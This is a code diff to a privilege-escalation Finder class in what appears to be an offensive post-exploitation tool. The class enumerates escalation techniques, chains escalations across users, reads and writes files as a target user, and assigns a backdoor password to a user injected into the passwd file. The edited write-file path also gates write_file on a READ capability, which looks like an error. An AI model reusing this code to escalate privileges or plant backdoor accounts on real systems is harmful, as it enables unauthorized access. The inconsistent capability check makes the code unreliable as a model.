@@ -150,31 +150,37 @@ class Finder:
             raise PrivescError("max depth reached")
 
         # Enumerate escalation options for this user
-        techniques = []
+        user_map = {}
         for method in self.methods:
             try:
-                found_techniques = method.enumerate(capability=Capability.ALL)
+                found_techniques = method.enumerate(Capability.ALL)
                 for tech in found_techniques:
-
-                    if tech.user == target_user and (
-                        tech.capabilities & Capability.WRITE
+                    if (
+                        tech.user == target_user
+                        and Capability.READ in tech.capabilities
                     ):
                         try:
                             tech.method.write_file(filename, data, tech)
                             return chain
-                        except PrivescError as e:
+                        except PrivescError:
                             pass
-                techniques.extend(found_techniques)
+                    if tech.user not in user_map:
+                        user_map[tech.user] = []
+                    user_map[tech.user].append(tech)
             except PrivescError:
                 pass
 
+        shlvl = self.pty.getenv("SHLVL")
+
         # We can't escalate directly to the target to read a file. So, try recursively
         # against other users.
-        for tech in techniques:
-            if tech.user == target_user:
+        for user, techniques in user_map.items():
+            if user == target_user:
+                continue
+            if self.in_chain(user, chain):
                 continue
             try:
-                exit_command = self.escalate_single(tech)
+                tech, exit_command = self.escalate_single(techniques, shlvl)
                 chain.append((tech, exit_command))
             except PrivescError:
                 continue
@@ -217,31 +223,36 @@ class Finder:
             raise PrivescError("max depth reached")
 
         # Enumerate escalation options for this user
-        techniques = []
+        user_map = {}
         for method in self.methods:
             try:
-                found_techniques = method.enumerate(capability=Capability.ALL)
+                found_techniques = method.enumerate(Capability.ALL)
                 for tech in found_techniques:
                     if tech.user == target_user and (
                         tech.capabilities & Capability.READ
                     ):
                         try:
                             read_pipe = tech.method.read_file(filename, tech)
-
                             return (read_pipe, chain)
-                        except PrivescError as e:
+                        except PrivescError:
                             pass
-                techniques.extend(found_techniques)
+                    if tech.user not in user_map:
+                        user_map[tech.user] = []
+                    user_map[tech.user].append(tech)
             except PrivescError:
                 pass
 
+        shlvl = self.pty.getenv("SHLVL")
+
         # We can't escalate directly to the target to read a file. So, try recursively
         # against other users.
-        for tech in techniques:
-            if tech.user == target_user:
+        for user, techniques in user_map.items():
+            if user == target_user:
+                continue
+            if self.in_chain(user, chain):
                 continue
             try:
-                exit_command = self.escalate_single(tech)
+                tech, exit_command = self.escalate_single(techniques, shlvl)
                 chain.append((tech, exit_command))
             except PrivescError:
                 continue
@@ -336,8 +347,8 @@ class Finder:
                 users = self.pty.reload_users()
 
                 # Check if the new passwd file contained the file
-                if user not in users:
-                    self.pty.users[user]["password"] = password
+                if user in users:
+                    self.pty.users[user]["password"] = self.backdoor_password
                     self.backdoor_user = self.pty.users[user]
 
                     # Switch to the new user
